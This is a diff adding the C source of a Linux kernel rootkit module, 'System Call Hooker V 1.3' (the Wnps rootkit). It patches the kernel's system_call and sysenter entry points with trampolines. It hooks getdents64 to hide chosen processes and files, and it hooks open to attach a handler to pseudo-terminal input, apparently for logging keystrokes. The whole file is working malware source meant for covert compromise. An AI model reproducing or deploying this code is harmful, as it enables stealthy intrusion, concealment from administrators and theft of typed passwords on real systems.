@@ -1,0 +1,442 @@
+/*
+        System Call Hooker V 1.3
+
+        by wzt  <wzt@xsec.org>
+*/
+
+#include <linux/types.h>
+#include <linux/stddef.h>
+#include <linux/unistd.h>
+#include <linux/module.h>
+#include <linux/version.h>
+#include <linux/kernel.h>
+#include <linux/string.h>
+#include <linux/mm.h>
+#include <linux/slab.h>
+#include <linux/sched.h>
+#include <linux/in.h>
+#include <linux/skbuff.h>
+#include <linux/netdevice.h>
+#include <linux/file.h>
+#include <linux/fs.h>
+#include <linux/proc_fs.h>
+#include <linux/namei.h>
+#include <linux/dirent.h>
+#include <linux/kobject.h>
+#include <linux/ip.h>
+#include <linux/netdevice.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/list.h>
+#include <linux/ptrace.h>
+#include <linux/spinlock.h>
+#include <linux/tty.h>
+#include <linux/tty_driver.h>
+#include <net/tcp.h>
+#include <asm/processor.h>
+#include <asm/uaccess.h>
+#include <asm/unistd.h>
+#include "config.h"
+#include "hook.h"
+#include "klogger.h"
+
+extern void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count);
+extern void (*old_receive_buf)(struct tty_struct *,const unsigned char *,char *,int);
+extern void init_tty(struct tty_struct *tty, int tty_index);
+
+asmlinkage long (*orig_getdents64)(unsigned int fd, struct dirent64 *dirp, unsigned int count);
+asmlinkage long (*orig_open)(const char __user *filename,int flags,int mode);
+
+asmlinkage long Sys_getdents64(unsigned int fd, struct dirent64 *dirp, unsigned int count);
+asmlinkage int Sys_open(const char __user *filename,int flags,int mode);
+int hook_init(void);
+
+static char read_buf[BUFF];
+
+unsigned long sysenter;
+
+void new_idt(void)
+{
+        ASMIDType
+        (
+                "cmp %0, %%eax      \n"
+                "jae syscallmala        \n"
+                "jmp hook               \n"
+
+                "syscallmala:           \n"
+                "jmp dire_exit          \n"
+
+                : : "i" (NR_syscalls)
+        );
+}
+
+void set_idt_handler(void *system_call)
+{
+        unsigned char *p;
+        unsigned long *p2;
+
+        p = (unsigned char *) system_call;
+        while (!((*p == 0x0f) && (*(p+1) == 0x83)))
+        p++;
+
+        p -= 5;
+        *p++ = 0x68;
+
+        p2 = (unsigned long *) p;
+        *p2++ = (unsigned long) ((void *) new_idt);
+
+        p = (unsigned char *) p2;
+        *p = 0xc3;
+
+        while (!((*p == 0x0f) && (*(p+1) == 0x82)))
+                p++;
+        p -= 5;
+
+        *p++ = 0x68;
+        p2 = (unsigned long *) p;
+        *p2++ = (unsigned long) ((void *) new_idt);
+
+        p = (unsigned char *) p2;
+        *p = 0xc3;
+}
+
+void set_sysenter_handler(void *sysenter)
+{
+        unsigned char *p;
+        unsigned long *p2;
+
+        p = (unsigned char *) sysenter;
+
+        while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
+                p++;
+
+        while (!((*p == 0x0f) && (*(p+1) == 0x83)))
+                p--;
+        p -= 5;
+        *p++ = 0x68;
+
+        p2 = (unsigned long *) p;
+        *p2++ = (unsigned long) ((void *) new_idt);
+
+        p = (unsigned char *) p2;
+        *p = 0xc3;
+}
+
+void hook(void)
+{
+        register int eax asm("eax");
+
+        switch(eax)
+        {
+                case __NR_getdents64:
+                        CallHookedSyscall(Sys_getdents64);
+                        break;
+                case __NR_open:
+                        CallHookedSyscall(Sys_open);
+        	       	break;
+                default:
+                        JmPushRet(dire_call);
+	               break;
+    }
+
+    JmPushRet(after_call);
+}
+
+/*
+int read_kallsyms(void)
+{
+        mm_segment_t old_fs;
+        ssize_t bytes;
+        struct file *file = NULL;
+        char *p,temp[20];
+        int i = 0;
+
+        file = filp_open(PROC_HOME,O_RDONLY,0);
+        if (!file)
+                return -1;
+
+        if (!file->f_op->read)
+                return -1;
+
+        old_fs = get_fs();
+        set_fs(get_ds());
+
+        while((bytes = file->f_op->read(file,read_buf,BUFF,&file->f_pos))) {
+                set_fs(old_fs);
+                if (( p = strstr(read_buf,SYSENTER_ENTRY)) != NULL)
+                        break;
+        }
+
+        while (*p--)
+                if (*p == '\n')
+                        break;
+
+        while (*p++ != ' ')
+                temp[i++] = *p;
+
+        temp[--i] = '\0';
+        sysenter = simple_strtoul(temp,NULL,16);
+
+	#if DEBUG == 1
+        printk("\n[+] sysenter : %x\n",sysenter);
+	#endif
+
+        //set_fs(old_fs);
+        filp_close(file,NULL);
+
+        return 0;
+}
+*/
+
+int read_kallsyms(void)
+{
+        mm_segment_t old_fs;
+        ssize_t bytes;
+        struct file *file = NULL;
+        char *p,temp[20];
+        int i = 0;
+
+        file = filp_open(PROC_HOME,O_RDONLY,0);
+        if (!file)
+                return -1;
+
+        if (!file->f_op->read)
+                return -1;
+
+        old_fs = get_fs();
+        set_fs(get_ds());
+
+        while((bytes = file->f_op->read(file,read_buf,BUFF,&file->f_pos))) {
+                if (( p = strstr(read_buf,SYSENTER_ENTRY)) != NULL) {
+                        while (*p--)
+                                if (*p == '\n')
+                                        break;
+
+                        while (*p++ != ' ') {
+                                temp[i++] = *p;
+                        }
+                        temp[--i] = '\0';
+                        sysenter = simple_strtoul(temp,NULL,16);
+			#if DEBUG == 1
+                        printk("0x%8x\n",sysenter);
+			#endif
+			break;
+                }
+        }
+
+
+        filp_close(file,NULL);
+
+        return 0;
+}
+
+
+
+void *get_sysenter_entry(void)
+{
+        void *psysenter_entry = NULL;
+        unsigned long v2;
+
+        if (boot_cpu_has(X86_FEATURE_SEP))
+	       rdmsr(MSR_IA32_SYSENTER_EIP, psysenter_entry, v2);
+        else {
+		#if DEBUG == 1
+		printk("[+] serach sysenter_entry...");
+		#endif
+		read_kallsyms();
+		if (sysenter == 0) {
+			#if DEBUG == 1
+			printk("[-] Wnps installed failed.\n");
+			#endif
+		}	
+	       	return ((void *) sysenter);
+	}
+
+        return(psysenter_entry);
+}
+
+/* get sys_call_table address */
+void *get_sct_addr(unsigned int system_call)
+{
+	unsigned char *p;
+	unsigned long s_c_t;
+
+	p = (unsigned char *) system_call;
+	while (!((*p == 0xff) && (*(p+1) == 0x14) && (*(p+2) == 0x85)))
+		p++;
+
+	dire_call = (unsigned long) p;
+
+	p += 3;
+	s_c_t = *((unsigned long *) p);
+
+	p += 4;
+	after_call = (unsigned long) p;
+
+	while (*p != 0xfa)     /* cli */
+		p++;
+
+	dire_exit = (unsigned long) p;
+
+	return((void *) s_c_t);
+}
+
+asmlinkage int Sys_open(const char __user *filename,int flags,int mode)
+{
+        int ret = 0;
+        static int fl = 0;
+        struct file * file = NULL;
+	struct task_struct *tsk = NULL;
+	struct tty_struct *tty = NULL;
+
+        ret = (*orig_open)(filename, flags, mode);
+
+        if (ret >= 0) {
+		BEGIN_KMEM
+		tsk = current;
+		if (!strcmp(tsk->comm,"top") ||
+			!strcmp(tsk->comm,"network") ||
+			!strcmp(tsk->comm,"ps") ||
+			!strcmp(tsk->comm,"ifup") ||
+			!strcmp(tsk->comm,"ifcfg-eth0") ||
+			!strcmp(tsk->comm,"iptables") || 
+			!strcmp(tsk->comm,"sysctl") ) {
+			
+			set_fs(old_fs);
+			return ret;
+		}
+
+                file = fget((unsigned int)ret);
+                tty = file->private_data;
+		
+		if (tty != NULL) {
+			if (tty->driver != NULL) {
+			if ((tty->driver->type == TTY_DRIVER_TYPE_PTY &&
+				tty->driver->subtype == PTY_TYPE_SLAVE
+				&& tty->ldisc.receive_buf != NULL &&
+				tty->ldisc.receive_buf != new_receive_buf)) {
+					if (!fl) {
+						#if DEBUG == 1
+						printk("[+] it's a pts%d.\n",tty->index);
+						#endif
+						
+						old_receive_buf = tty->ldisc.receive_buf;
+						fl = 1;
+					}
+					init_tty(tty,TTY_INDEX(tty));
+				}
+			}
+		}
+
+                fput(file);
+                END_KMEM
+        }
+
+        return ret;
+}
+
+asmlinkage long Sys_getdents64(unsigned int fd, struct dirent64 *dirp, unsigned int count)
+{
+        struct dirent64 *td1, *td2;
+        long ret, tmp;
+        unsigned long hpid, nwarm;
+        short int hide_process, hide_file;
+
+        /* first we get the orig information */
+        ret = (*orig_getdents64) (fd, dirp, count);
+        if (!ret)
+	       return ret;
+
+        /* get some space in kernel */
+        td2 = (struct dirent64 *) kmalloc(ret, GFP_KERNEL);
+        if (!td2)
+                return ret;
+
+        /* copy the dirp struct to kernel space */
+        __copy_from_user(td2, dirp, ret);
+
+        td1 = td2, tmp = ret;
+        while (tmp > 0) {
+                tmp -= td1->d_reclen;
+	        hide_file = 1;
+	        hide_process = 0;
+                hpid = 0;
+                hpid = simple_strtoul(td1->d_name, NULL, 10);
+
+                /* If we got a file like digital,it may be a task in the /proc.
+                   So check the task with the task pid.
+                */
+                if (hpid != 0) {
+                        struct task_struct *htask = current;
+                        do  {
+                                if(htask->pid == hpid)
+                                        break;
+                                else
+                                        htask = next_task(htask);
+			} while (htask != current);
+
+                        /* we get the task which will be hide */
+                        if ( ((htask->pid == hpid) && (strstr(htask->comm, HIDE_TASK) != NULL)))
+                                hide_process = 1;
+                }
+
+                if ((hide_process) || (strstr(td1->d_name, HIDE_FILE) != NULL)) {
+		        ret -= td1->d_reclen;
+		        hide_file = 0;
+		        /* we cover the task information */
+                        if (tmp)
+                                memmove(td1, (char *) td1 + td1->d_reclen, tmp);
+	        }
+
+                /* we hide the file */
+	        if ((tmp) && (hide_file))
+                        td1 = (struct dirent64 *) ((char *) td1 + td1->d_reclen);
+
+	}
+
+        nwarm = __copy_to_user((void *) dirp, (void *) td2, ret);
+        kfree(td2);
+
+        return ret;
+}
+
+
+int hook_init(void)
+{
+	struct descriptor_idt *pIdt80;
+	
+        __asm__ volatile ("sidt %0": "=m" (idt48));
+
+        pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);
+
+        system_call_addr = (pIdt80->offset_high<<16 | pIdt80->offset_low);
+	
+	#if DEBUG == 1
+        printk(KERN_ALERT "[+] system_call addr : 0x%8x\n",system_call_addr);
+	#endif
+
+        sys_call_table_addr = get_sct_addr(system_call_addr);
+
+	#if DEBUG == 1
+        printk(KERN_ALERT "[+] sys_call_table addr : 0x%8x\n",(unsigned int)sys_call_table_addr);
+	#endif
+
+        sys_call_table = (void **)sys_call_table_addr;
+
+        sysenter_entry = get_sysenter_entry();
+
+        orig_getdents64 = sys_call_table[__NR_getdents64];
+	orig_open = sys_call_table[__NR_open];
+
+        set_idt_handler((void *)system_call_addr);
+        set_sysenter_handler(sysenter_entry);
+
+	#if DEBUG == 1
+	printk(KERN_ALERT "[+] Wnps installed successfully!\n");
+	#endif
+        
+        return 0;
+}
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("wzt");
